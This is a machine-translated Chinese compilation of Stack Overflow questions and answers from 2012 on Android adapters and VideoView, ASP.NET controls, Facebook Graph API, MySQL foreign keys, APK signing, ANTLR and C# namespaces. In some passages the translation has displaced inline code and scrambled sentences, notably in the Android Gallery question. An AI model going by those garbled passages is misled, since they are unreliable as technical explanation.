您声明全局变量映射的代码片段正在工作。但是Jquery 没有onReady 和onLoad 方法。更好地创建将在 $(document).ready() 函数中执行的 init() 函数，不要混合 $(document).ready 和 body.onload 函数。使用 init 函数和它 document.ready 事件。

# android - 自定义 ArrayAdapter 不更新子小部件

> ID：10246808
> 
> 赞同：1
> 
> 时间：2012-04-20T13:03:53.890
> 
> 标签：android

我遇到了一个问题，即我的 ListView 的自定义 ArrayAdapter 没有更新 Gallery 小部件及其内容，它有一个 Gallery 小部件和两个 TextView 作为子项。

为了设置应用程序的背景，我正在创建一个应用程序，它允许两个或多个设备通过蓝牙相互连接，并将每个设备的照片流式传输到其连接的设备。现在，只是为了实现的缘故，每个设备都表示在一个可滚动的列表视图中，其中包含画廊小部件（所有设备的图像都可以水平滚动）和它下方的两个 TextView 小部件，用于识别发送者。

ListView 的布局如下：

```
<LinearLayout ...>
    <Gallery .../>
    <LinearLayout>
        <TextView .../>
        <TextView .../>
    </LinearLayout>
</LinearLayout> 
```

图像发送和接收不是问题，我已经反复测试过它们。

问题似乎在于自定义 ArrayAdapter 的`notifyDataSetChanged()`方法没有按预期运行。当我在 ListView （在我的 main `Activity`）中创建一个新的 ImageHolderClass 对象时，我这样做如下`mImageHolderAdapter.add(new ImageHolderClass(this, "Me", mBtAdapter.getAddress(), mLocalImageList));`：知道`add()`适配器的方法应该是调用`notifyDataSetChanged()`，它对创建和添加的第一个对象按预期工作。但是当我添加另一个对象或向对象添加任何新图像时`imageList`，它们会创建存储在第一个对象中的图像的精确副本。

现在，有趣的是每个中的两个 TextView 变量都`ImageHolderClass`设法更新了，但 Gallery 中的图像似乎保持完全相同。

我尝试绕过(with a ) 方法`add()`中的方法，然后仅在添加其他图像时强制 a ，这似乎显示其他图像（但不显示所有图像），但不是仅当设备并且没有连接其他设备。`ImageHolderAdapter()``addItem()``notifyDataSetChanged()`

我的自定义 ArrayAdapter 如下：

```
public class ImageHolderAdapter extends ArrayAdapter<ImageHolderClass>{
private ArrayList<ImageHolderClass> objects;

public ImageHolderAdapter(Context context, int layoutResourceId, ArrayList<ImageHolderClass> objects) {
    super(context, layoutResourceId, objects);
    this.objects = objects;
}

public static class ViewHolder {
    public Gallery gallery;
    public TextView deviceName;
    public TextView deviceAddress;
    public ArrayList imageList;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
    // Assign the view we are converting to a local variable
    View v = convertView;
    ViewHolder holder;

    // first check to see if the view is null. If it is, then we have to inflate it.
    if (v == null) {
        LayoutInflater inflater = (LayoutInflater) getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        v = inflater.inflate(R.layout.imageholder, null);
        holder = new ViewHolder();
        holder.gallery = (Gallery)v.findViewById(R.id.gallery);
        holder.gallery.setAdapter(new ImageAdapter(getContext(), objects.get(position).imageList));
        holder.deviceName = (TextView)v.findViewById(R.id.deviceName);
        holder.deviceAddress = (TextView)v.findViewById(R.id.deviceAddress);
        v.setTag(holder);
    } else {
        holder = (ViewHolder)v.getTag();
    }

    final ImageHolderClass imageHolderClass = objects.get(position);

    if (imageHolderClass != null) {
        holder.gallery = imageHolderClass.getGallery();
        holder.deviceName.setText(imageHolderClass.getDeviceName());
        holder.deviceAddress.setText(imageHolderClass.getDeviceAddress());
    }

    return v;
}

public class ImageAdapter extends BaseAdapter {
    int mGalleryItemBackground;
    private Context mContext;
    ArrayList list;

    public ImageAdapter(Context c, ArrayList list) {
        mContext = c;
        this.list = list;
        TypedArray attr = mContext.obtainStyledAttributes(R.styleable.TestbedActivity);
        mGalleryItemBackground = attr.getResourceId(R.styleable.TestbedActivity_android_galleryItemBackground, 0);
        attr.recycle();
    }

    public int getCount() {
        return list.size();
    }

    public Object getItem(int position) {
        return list.get(position);
    }

    public long getItemId(int position) {
        return position;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        ImageView imageView = new ImageView(mContext);

        imageView.setImageBitmap((Bitmap)list.get(position));
        imageView.setLayoutParams(new Gallery.LayoutParams(180, 150));
        imageView.setScaleType(ImageView.ScaleType.FIT_XY);
        imageView.setBackgroundResource(mGalleryItemBackground);

         return imageView;
    }
} 
```

}

和上面使用的ImageHolderClass如下：

```
public class ImageHolderClass {
public Gallery gallery;
public String deviceName;
public String deviceAddress;
public ArrayList imageList;

public ImageHolderClass() {
    super();
}

public ImageHolderClass(Context c, String deviceName, String deviceAddress, ArrayList imageList) {
    super();
    this.gallery = new Gallery(c);
    this.deviceName = deviceName;
    this.deviceAddress = deviceAddress;
    this.imageList = imageList;
}

public Gallery getGallery() {
    return gallery;
}

public void setGallery(Gallery gallery) {
    this.gallery = gallery;
}

public String getDeviceName() {
    return deviceName;
}

public void setDeviceName(String deviceName) {
    this.deviceName = deviceName;
}

public String getDeviceAddress() {
    return deviceAddress;
}

public void setDeviceAddress(String deviceAddress) {
    this.deviceAddress = deviceAddress;
}

public void setImageList(ArrayList list) {
    this.imageList = list;
}

public ArrayList getImageList() {
    return imageList;
} 
```

}

生成的图像（两个 ListView 对象具有相同的图像（但不应该））可以在下图中看到：http: [//i.stack.imgur.com/koL2Q.jpg](http://i.stack.imgur.com/koL2Q.jpg)

我试过`Gallery`用 custom 换掉小部件`HorizontalListView`，但这给了我完全相同的结果，所以我知道这不是由于`Gallery`小部件的实现。

**更新**

我修改了我的代码，将每个图像单独添加到`ImageHolderAdapter`. 之前，我会创建一个`ArrayList`，将我所有的图像存储在其中，然后在`ImageHolderAdapter`. 下面的方法显示了我如何“批量”添加图像

```
public void loadImages(String userName, String deviceAddress, ArrayList imageList) {
    mImageHolderAdapterList.add(new ImageHolderClass(this, userName, deviceAddress, imageList));
    mImageHolderAdapter.notifyDataSetChanged();
} 
```

现在，我`ImageHolderClass`在填充`imageList`. 然后我从`ImageHolderAdapter`（通过使用`mImageHolderAdapter.getItem(position)`）中获取特定对象，`imageList`从那个和`add()`到`ArrayList`. `mImageHolderAdapter.notifyDataSetChanged()`然后，每当我进行任何修改时，我都会打电话。

但是，如果我单独填充图像，现在不会显示任何图像。我得到的只是图像应该在的黑屏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T13:55:52.230

您应该在 if 语句之外设置画廊的适配器。

```
if (v == null) {
    LayoutInflater inflater = (LayoutInflater) getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    v = inflater.inflate(R.layout.imageholder, null);
    holder = new ViewHolder();
    holder.gallery = (Gallery)v.findViewById(R.id.gallery);        
    holder.deviceName = (TextView)v.findViewById(R.id.deviceName);
    holder.deviceAddress = (TextView)v.findViewById(R.id.deviceAddress);
    v.setTag(holder);
} else {
    holder = (ViewHolder)v.getTag();
}

holder.gallery.setAdapter(new ImageAdapter(getContext(), objects.get(position).imageList)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T13:59:02.557

[适配器数据更改时更新列表视图](https://stackoverflow.com/questions/4198425/updating-the-list-view-when-the-adapter-data-changes)

尝试使视图或适配器无效 (notifyDataSetChanged() ) ...

# c# - 在同一页面/表单.net 上多次使用自定义控件

> ID：10246817
> 
> 赞同：0
> 
> 时间：2012-04-20T13:04:41.223
> 
> 标签：c#, asp.net, .net, custom-controls

一段时间以来，我一直在构建自定义控件，并克服了许多障碍。我尚未解决的一个挑战是在同一页面上多次使用自定义控件的能力。

我有一个单独运行良好的自定义控件，但是当页面上放置两个相同的控件时，第二个控件能够控制第一个控件。我的猜测是第一个（控件）是第一个对象，第二个是同一个对象。如何在代码中确保如果我在一个页面上多次使用同一个控件，它将表现为两个单独的控件。是否有任何具体的事情我应该查看以确保它允许它多次出现在页面上。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:09:13.313

添加控件的多个实例时，请确保为它们指定不同的 ID。然后在编写任何与它们交互的代码时，通过该 ID 引用它们。

```
<%@ Register Src="controls/myControl.ascx" TagName="myControl" TagPrefix="uc1" %>

<asp:Content ID="Content1" ContentPlaceHolderID="MainPlaceHolder" runat="server">
    <uc1:myControl ID="ctlFirst" runat="server">
    <uc1:myControl ID="ctlSecond" runat="server">
</asp:Content> 
```

然后在后面的代码中：

```
ctlFirst.SomeProperty = true;
ctlSecond.SomeProperty = false; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:17:04.907

将自定义控件的几个实例放到 ASPX 页面上，然后查看 HTML 源代码并查看*每个*控件实例上生成的*所有*元素 ID 。ASP.NET 将自动修改控件子项的 ID，并在它们前面加上父控件的 ID。如果您输出的是原始 HTML，这可能不会发生。如果有任何重复的 ID，那么这可能是您的问题的原因，特别是如果您使用客户端逻辑来操作页面上的控件。

 *此外，请确保您没有在控件中使用任何会话或应用程序变量。*

# ms-access - 水晶报表导出到 MS 访问

> ID：10246827
> 
> 赞同：1
> 
> 时间：2012-04-20T13:05:15.043
> 
> 标签：ms-access, crystal-reports, export

我想将水晶报表的数据导出到 Ms Access 中，因为报表有将近 200 万条记录，而 Excel 不支持那么多数据。是否有任何水晶报表插件或其他东西可以在不更改我的代码的情况下导出数据（因为更新代码必须经过漫长的过程）。我正在使用 Dotnet 2.0 (VS2005)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T17:14:56.580

Crystal Reports 没有 Microsoft-Access-export 库。您将需要使用 CSV 或 TTX。

一个更好的：为什么需要导出 2M 的记录？如果这确实是一个要求，那么直接从数据库中执行此操作会更有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T17:49:35.030

“水晶报表的数据”是什么意思？Crystal Report 不保存数据。它只是具有连接到数据库的能力。因此，使用 ms-access 直接连接到同一个数据库可能会更聪明。连接后，将数据传输到 ms-access 将是小菜一碟……

# php - PHP - 长轮询通知（PHP 标志或其他方式？）

> ID：10246828
> 
> 赞同：1
> 
> 时间：2012-04-20T13:05:17.813
> 
> 标签：php, node.js, socket.io, comet, long-polling

我很快就开始了一个新项目，并且我正在考虑进行长时间轮询以通知用户他们有一条新的私人消息/他们必须检查的通知，这与 Facebook 用来通知您有人发布了有关您/喜欢的内容的方式非常相似你的照片。。

根据我的阅读，cometd 似乎是一个非常好的开始选择。

然后，其他方式开始出现，例如：Socket.io 和 node.js ..

现在，我的问题是；您认为哪一个是这种情况下的最佳选择，为什么？

我需要做的是以下内容；

*   用户 1 登录到他们的帐户
*   用户 2 向用户 1 发送一条消息，该消息被存储到数据库中并生成一个标志，（如果可能？！）
*   负责用户 1 的 PHP 脚本应该拿起标志，并向用户 1 推送通知

我知道如何处理 javascript 方面，但我从未做过类似长轮询的事情。我使用 jQuery 作为 javascript 库和 PHP 作为服务器端。

所以建议和任何好的资源来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:08:42.063

结合使用 php 和 node.js 将是有益的。node.js 用于持久连接，并推送通信而不是轮询。

[http://nodejs.org/](http://nodejs.org/)

这是我发现的一个快速视频：http: [//vimeo.com/29099827](http://vimeo.com/29099827)

# c# - 如何在 Visual Studio 调试器中查看位图对象？

> ID：10246831
> 
> 赞同：31
> 
> 时间：2012-04-20T13:05:21.453
> 
> 标签：c#, visual-studio-2010, debugging, c#-4.0, bitmap

我正在构建一个创建许多位图（System.Drawing.Image）的 C# 应用程序。将调试器中的位图视为图片将有很大帮助。调试器具有对 XML 文件的本机支持。有没有办法查看图片？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-20T13:07:51.327

Bitmap 默认没有调试器可视化工具，因此您可能想尝试一下：http: [//imagedebugvisualizer.codeplex.com/](http://imagedebugvisualizer.codeplex.com/)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2016-04-17T11:55:00.593

另一个在 Visual Studio 2019 中工作的开源图像和位图可视化工具：

[https://github.com/Jaex/ImageVisualizer](https://github.com/Jaex/ImageVisualizer)

它的截图：

![](../Images/2ab89791e4739449f0e6eeb358c749ed.png)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-11-06T12:23:43.673

在我阅读上面瑞秋的评论之前，我就这样做了，这会容易得多....

您可以对其进行 Base64 编码 - 在您的直接窗口中：

```
System.IO.MemoryStream stream = new System.IO.MemoryStream();
yourImage.Save(stream, System.Drawing.Imaging.ImageFormat.Bmp);
byte[] bytes = stream.ToArray();
base64string = System.Convert.ToBase64String(bytes); 
```

然后将 base64string 的值复制并粘贴到您最喜欢的 base64 调试器中，例如

[https://codebeautify.org/base64-to-image-converter](https://codebeautify.org/base64-to-image-converter)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-04-30T16:30:41.370

这个程序在 2013 年适用于我，应该从 2010 年到 15 年运行 [http://bytescout.com/products/developer/bitmapvisualizer/index.html](http://bytescout.com/products/developer/bitmapvisualizer/index.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-10-03T11:01:19.437

尝试 ByteScout 的 BitMapVisualizer [http://bytescout.com/products/developer/bitmapvisualizer/index.html](http://bytescout.com/products/developer/bitmapvisualizer/index.html)

试用版是免费的

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-09-25T15:01:15.520

另一个不错的选择是[用于 Visual Studio 2013 的 Bitmap & BitmapSource Visualizer](https://bitmapsourcevisualizer.codeplex.com/)。它还有作为源代码的好处（由于我的机器中的 3.5 存在问题，我用它重新编译到 4.5 框架中）。

默认情况下，它会添加有关图像的信息（与添加更多信息的`Width`Bytescout[插件](http://bytescout.com/products/developer/bitmapvisualizer/index.html)相比），但您可以通过代码添加任何信息 -使用起来很简单。`Height``String.Format`

# facebook - 如何使用 Graph API 获取家乡的 facebook 好友列表？

> ID：10246833
> 
> 赞同：1
> 
> 时间：2012-04-20T13:05:33.043
> 
> 标签：facebook, api

我知道您可以使用以下网址获取朋友列表：

[https://graph.facebook.com/me/friends?access_token=XXX](https://graph.facebook.com/me/friends?access_token=XXX)

但是我看到有一个有id和名字的朋友列表，但我需要这个列表上的家乡。我请求了 friends_hometown 许可，当我运行这个 url 时：

[https://graph.facebook.com/100001986459077?access_token=XXX](https://graph.facebook.com/100001986459077?access_token=XXX)

然后它工作正常 - 我在所有领域中看到了家乡。

但我不想为所有朋友调用第二个 URL（太多次）。我想使用第一个 URL 在一次通话中得到它。有没有办法实现这个目标？

注意：据我所知，我对 FQL 解决方案不感兴趣。我只需要图形 API 有效 url 来执行此操作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T09:21:58.497

https://graph.facebook.com/me/friends?fields=id,name,hometown,location&access_token=[access_token_here] 将为您提供您想要的列表。

您需要确保访问令牌的范围包括朋友的位置和家乡，以便检索该用户的朋友数据的数据。

# android - ActionBarSherlock 和 3.0 之前的 Android 设备

> ID：10246836
> 
> 赞同：1
> 
> 时间：2012-04-20T13:05:41.733
> 
> 标签：android, android-3.0-honeycomb, android-4.0-ice-cream-sandwich, actionbarsherlock

我正在为 Android 应用程序实现 SherlockActionBar，但我想保持与前 Honeycomb 设备的向后兼容性。

这是示例代码：

```
package com.sherlockbar.example;

import android.os.Bundle;
import android.support.v4.app.FragmentTransaction;
import android.widget.TextView;

import com.actionbarsherlock.app.ActionBar;
import com.actionbarsherlock.app.ActionBar.Tab;
import com.actionbarsherlock.app.SherlockActivity;

public class SherlockExampleActivity extends SherlockActivity implements ActionBar.TabListener {
    private TextView mSelected;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.tab_navigation);
        mSelected = (TextView) findViewById(R.id.text);

        getSupportActionBar().setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);
        for (int i = 1; i <= 3; i++) {
            ActionBar.Tab tab = getSupportActionBar().newTab();
            tab.setText("Tab " + i);
            tab.setTabListener(this);
            getSupportActionBar().addTab(tab);
        }
    }

    @Override
    public void onTabReselected(Tab tab, FragmentTransaction transaction) {
    }

    @Override
    public void onTabSelected(Tab tab, FragmentTransaction transaction) {
        mSelected.setText("Selected: " + tab.getText());
    }

    @Override
    public void onTabUnselected(Tab tab, FragmentTransaction transaction) {
    }
} 
```

对于 4.0 设备，这很完美，但对于 Honeycomb，它不起作用 - 我收到以下错误：

> E/AndroidRuntime(2363)：原因：java.lang.IllegalStateException：您必须使用 Theme.Sherlock、Theme.Sherlock.Light、Theme.Sherlock.Light.DarkActionBar 或衍生产品。

在清单中，我试图确定它们，但它不在建议的列表中，而且如果我写它，我仍然会收到错误。

请问如何设置 Honeycomb 设备的标准？

提前非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:41:56.940

Are you compiling against 4.0? You need to target the Android 4.0 sdk in order for it to compile correctly (even if you're running on < 4.0).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:19:04.147

确保您已将 ActionBarSherlock 设置为库项目。在您这样做之前，您的项目将无法访问 ABS 中的资源

# android - 视频不循环 Android VideoView

> ID：10246838
> 
> 赞同：4
> 
> 时间：2012-04-20T13:05:51.023
> 
> 标签：android, loops, android-videoview

我正在尝试构建一个可以循环播放视频的 android 应用程序！问题是它永远不会循环！它只播放一次视频！在调试过程中，我意识到“myVideoView.setOnCompletionListener”正在执行，但视频没有播放！我还在 CompletionListener 中尝试了“mp.reset()”。也许我在不同的文件中遗漏了一些东西，比如清单？

有什么想法吗？这是我的代码：

```
 final VideoView myVideoView = (VideoView)findViewById(R.id.myvideoview);
      myVideoView.setVideoURI(Uri.parse(SrcPath));     

       myVideoView.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
            @Override
            public void onPrepared(MediaPlayer arg0) {
                myVideoView.requestFocus();
                myVideoView.start();
           }
        });
       myVideoView.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
            public void onCompletion(MediaPlayer mp) {
                 myVideoView.setVideoURI(Uri.parse(SrcPath));

           }
        }); 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-15T12:01:53.777

尝试`onPreparedListener`代替`onCompletionListener`：

```
myVideoView.setOnPreparedListener(new OnPreparedListener() {
    @Override
    public void onPrepared(MediaPlayer mp) {
        mp.setLooping(true);
    }
}); 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-07-05T06:05:42.550

尝试这个。

```
myVideoView = (VideoView) findViewById(R.id.videoView1);
myVideoView.setVideoPath(video_path); 
myVideoView.setMediaController(new MediaController(this));
myVideoView.start();   

myVideoView.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {

    @Override
    public void onCompletion(MediaPlayer mp) {

        myVideoView.start();  

    }
}); 
```

由您的视频完成后重新开始...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-16T04:28:13.217

尝试这个。

```
 videoView.setVideoPath(tempFileMessageUri.toString());

            ctlr = new MediaController(context);
            ctlr.setMediaPlayer(videoView);

            videoView.setMediaController(ctlr);
            videoView.requestFocus();
            videoView.start();

            videoView.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(MediaPlayer mp) {
                    videoView.start();
                }
            });

            videoView.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                public void onCompletion(MediaPlayer mp) {
                    videoView.start();

                }
            }); 
```

# mysql - SQL 如何设置外键

> ID：10246844
> 
> 赞同：1
> 
> 时间：2012-04-20T13:06:10.177
> 
> 标签：mysql, sql

我需要创建 3 个看起来像这样的表

学生（**sid：CHAR（12）**，sname：VARCHAR（50），bdate：DATE，地址：VARCHAR（50），scity：VARCHAR（20），年份：CHAR（20），gpa：FLOAT）

公司（**cid：CHAR（8）**，cname：VARCHAR（20））

申请（**sid：CHAR（12）**，**cid：CHAR（8）**）

（粗体属性为主键）

但是我不确定如何设置外键，因为例如应用表的**cid**是应用表和公司表中的主键（应用表和学生表之间的**sid情况相同）。**谢谢你的帮助。

这些是创建表的代码：

```
myQuery = "CREATE TABLE student "
                + "(sid CHAR(12), sname VARCHAR(50), "
                + "bdate DATE, address VARCHAR(50), "
                + "scity VARCHAR(20), year CHAR(20), "
                + "gpa FLOAT) ENGINE=InnoDB;";
 myQuery = "CREATE TABLE company "
                + "(cid CHAR(8), cname VARCHAR(20), quota CHAR(8))ENGINE=InnoDB;";
myQuery = "CREATE TABLE apply "
                + "(sid CHAR(12), cid CHAR(8)) ENGINE=InnoDB;"; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:16:51.797

看起来该表是和`apply`之间的多对多连接。`student``company`

在这种情况下，您需要设置`student`并`company`喜欢您的设置（尽管发布的输出`SHOW CREATE TABLE student`可能会为您提供更多有用的答案）。因此，对于应用表，您需要两个外键：一个在`sid`which references`student.sid`上，一个在`cid`which references上`company.cid`。也许是这样的：

```
ALTER TABLE apply ADD CONSTRAINT sid FOREIGN KEY (sid) REFERENCES student(sid);
ALTER TABLE apply ADD CONSTRAINT cid FOREIGN KEY (cid) REFERENCES copmany(cid); 
```

编辑：根据您的表创建，您也没有设置主键。将`PRIMARY KEY`标识符添加到您希望作为主键的任何列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-09T12:47:27.883

我应用表将 sid 和 cid 都设置为外键..这个表在这里称为联结表，主键是 sid 和 cid 一起的复合主键。应用表外键是 SID 和 CID 应用表主键是 (sid,cid) 复合主键。每个公司可以有任意数量的学生。每个学生可以是任意数量的公司的一部分，但一个组合不会重复。

# android - 如何重现前开发人员签署我们的 Android 应用程序的方式？

> ID：10246850
> 
> 赞同：0
> 
> 时间：2012-04-20T13:06:30.550
> 
> 标签：android, jar-signing

我在签署我的应用程序时遇到问题。当我对其进行签名并上传时，我收到错误消息“该 apk 必须使用与以前版本相同的证书进行签名”。

在你问之前，是的，我确定它是同一个密钥库。我很确定这与我以前的同事签署的方式有关。我试过用两种方式签名：

1.  使用 jarsigner/zipalign。这会生成一个带有 META-INF 文件夹的 apk，其中包含 3 个文件：MYALIASN.RSA、MYALIASN.SF 和 MANIFEST.MF

2.  使用 eclipse ->export 导出已签名的应用程序。这会生成一个带有 META-INF 文件夹的 apk，其中包含 3 个文件：CERT.RSA、CERT.SF 和 MANIFEST.MF

我查看了旧的 apk，在 META-INF 目录中看到了 5 个文件：MYALIASN.RSA、MYALIASN.SF、CERT.RSA、CERT.SF 和 MANIFEST.MF。在使用 eclipse 签名后，我尝试使用 jarsigner 简单地对我的应用程序进行签名，这确实导致了相同的五个文件，但是唉，我仍然遇到了同样的错误。我在这里想念什么？有人对如何重现之前签名的方式有任何好的建议，还是我做错了？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:38:18.057

它必须使用相同的密钥库和相同的开发人员别名进行签名

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T17:41:22.637

我发现任何遇到这种情况的人都发生了什么。我的同事将 bin 文件夹中的 apk 用作“未签名的 apk”，然后正常签名。他的调试密钥库在他第一次上传时也嵌入到了 apk 中。我很确定，因为我们无法重现他的调试密钥库，所以我们很不走运:(

# java - antlr3 unicode 字符导致错误

> ID：10246851
> 
> 赞同：1
> 
> 时间：2012-04-20T13:06:33.607
> 
> 标签：java, unicode, antlr, antlr3

我正在尝试为具有 unicode 支持的小型 DSL 编写 antlr3 语法（德语变音符号需要，äöüÄÖÜß），但我似乎无法让它工作。

我编写了一个最小的测试语法，它应该匹配任何 unicode 字符序列，比如“xay”（可以正常工作）或“xäy”（不能。）

这是语法：

```
grammar X;

@lexer::header {
import org.antlr.runtime.ANTLRInputStream;
import org.antlr.runtime.ANTLRStringStream;
import org.antlr.runtime.CommonTokenStream;
import java.io.ByteArrayInputStream;
import java.io.IOException;
}

@lexer::members { 

    public static void main(String[] args) throws Exception {
        ANTLRInputStream stream = new ANTLRInputStream( new ByteArrayInputStream("x\u00C4y".getBytes()), "utf-8");
        XLexer lex = new XLexer(stream);
        CommonTokenStream c = new CommonTokenStream(lex);
        XParser p = new XParser(c);
        p.x();
    }

}

x   :    UTF8+;

UTF8 :  ('\u0000'..'\uF8FF'); 
```

对于“xäx”，我收到以下错误：

```
line 1:1 mismatched character '?' expecting set null 
```

我错过了什么？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T14:09:16.077

我编译了你的语法（使用 Antlr 3.4），**它对我有用，没有问题。**这是我所做的：

```
$ java -jar antlr-3.4-complete-no-antlrv2.jar X.g
$ javac -cp antlr-3.4-complete-no-antlrv2.jar XLexer.java XParser.java
$ CLASSPATH=$CLASSPATH:./antlr-3.4-complete-no-antlrv2.jar:./XLexer.class:./XParser.class java XLexer 
```

在解析之前，我还插入了一些代码将字符串打印到 STDOUT，它打印了预期的字符串`xÄy`。

**不过有一个想法：**也许您的**默认编码**（我认为，`file.encoding`在 JVM 启动时在属性中指定）设置为 UTF-8 以外的其他编码。要对此进行测试，请尝试在调用中明确指定编码`getBytes()`：

```
ANTLRInputStream stream = new ANTLRInputStream( new ByteArrayInputStream("x\u00C4y".getBytes("UTF-8")), "utf-8"); 
```

# c# - C# web 项目抱怨一个类

> ID：10246852
> 
> 赞同：0
> 
> 时间：2012-04-20T13:06:35.323
> 
> 标签：c#, asp.net

我创建了一个新项目（C# 中的 Web 项目）。在我的项目中创建了一个名为 App_Code 的新文件夹。然后，我继续添加一个具有以下内容的类：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using Shipper.DataLayer;

namespace Shipper.BusinessLayer
{
    public static class BL
    {
        public static int JustSomeTest()
        {
            return 1;
        }
    }
} 
```

在我后面的代码中的一个页面`default.aspx`中，我试图做：

`int i = BL.JustSomeTest();`

当我输入时，我没有得到任何智能感知`BL.`。它说我缺少一个程序集或参考。或者它会说`The name BL does not exist in the current context`。但是如果类文件在同一个项目中，我是否必须包含参考？我什至尝试构建我的项目，它首先生成了一个带有我的解决方案文件名称的 dll 文件，`Shipper.dll`但是一旦我添加了这个引用，它就会说`The name BL does not exist in the current context`.

在我的 default.aspx 页面中，我尝试添加 using 语句

`using Shipper.`

但是一旦我这样做了，我的命名空间 BusinessLayer 就没有显示出来......我很困惑？

# 编辑

这是default.aspx：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Shipper.BusinessLayer;

namespace Shipper
{
    public partial class _Default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!Page.IsPostBack)
            {
                SetDefaults();
                int i = BL.JustSomeTest();
            }
        }
   }
} 
```

这是我的`BL.cs`文件：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using Shipper.DataLayer;

namespace Shipper.BusinessLayer
{
    public static class BL
    {
        public static int JustSomeTest()
        {
            return 1;
        } 
    }
} 
```

错误读取`The type or namespace name`BusinessLayer`does not exist in the namespace Shipper (are you missing an assembly reference)?`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:09:39.817

您的...

```
public static int JustSomeTest()
 {
   return 1;
 } 
```

...是`out of the 'class'` - 您不能单独为命名空间定义方法。

（至少从您的示例来看，这可能只是一个错字，但您需要给我们一个工作示例）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T13:10:11.923

你的方法在课堂之外。那是不行的。试试这个：

```
namespace Shipper.BusinessLayer
{
    public static class BL
    {
        public static int JustSomeTest()
        {
            return 1;
        }
    }
} 
```

此外，如果您希望 BL 弹出，请确保引用了命名空间 ( `using Shipper.BusinessLayer`)。但是，为什么这是一个静态类？我认为您可能不希望这样做，除非您正在制作扩展方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T14:16:21.033

尝试让你的类不是静态的，但让你的方法保持静态。（只是因为我从不使用静态类，但它似乎没有任何区别）

或者，如果您遇到严重问题并且无法解决，请安装 Resharper 的副本，它可能会有所帮助！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T13:29:33.563

[Wrox 上的这个论坛帖子](http://p2p.wrox.com/book-beginning-asp-net-3-5-c-vb-book-isbn-978-0-470-18759-3/73539-app_code-folder-web-application-project.html)可能也很有用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T13:16:12.603

尝试删除命名空间声明：

```
using System;

public static class BL
{
    public static int JustSomeTest()
    {
       return 1;
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-20T13:09:06.087

尝试

使用 Shipper.BusinessLayer；

要尝试的事情

1.  通过在解决方案资源管理器中查看目标项目的属性来验证名称空间是否是您认为的名称。
2.  在 Visual Studio 中，使用对象浏览器并定位命名空间并验证可以看到类。如果对象浏览器看不到它，代码也看不到。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-20T13:50:30.890

首先要确保您添加了对 Shipper 项目的引用，而不是 Shipper DLL。

然后确保重新构建了 Shipper 项目，最好进行清理和构建。

然后再次检查您的智能感知，我怀疑您引用的是 Shipper dll 的旧版本。

# php - .NET MVC 迁移到 Twitter Bootstrap + KnockoutJS +？

> ID：10246855
> 
> 赞同：0
> 
> 时间：2012-04-20T13:06:43.477
> 
> 标签：php, asp.net-mvc-3, cakephp, node.js

我们使用 .NET MVC 开发了一套应用程序，并计划迁移到开源平台（由于成本、维护、人才、退出策略等原因）。

我们计划使用 Twitter Bootstrap 和 KnockoutJS（可能是 EmberJS，但有更高的学习障碍）来构建 Web 应用程序（而不是网站）。我们想要以下内容，您会推荐什么平台？

*   API 驱动
*   能够轻松与 API 集成：Twitter、FaceBook、LinkedIn 等。
*   最好将 ACL 安全性包含在框架中
*   MVC 框架
*   能够将表创建为对象（类似于 .NET MVC）
*   广泛的行业采用和支持
*   最低学习曲线（我们一般是 PHP 新手）
*   相对容易调试

到目前为止，我们已经研究了 CakePHP、Zend Framework、NodeJS。这些或其他建议中有什么建议吗？

干杯，院长

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:24:09.197

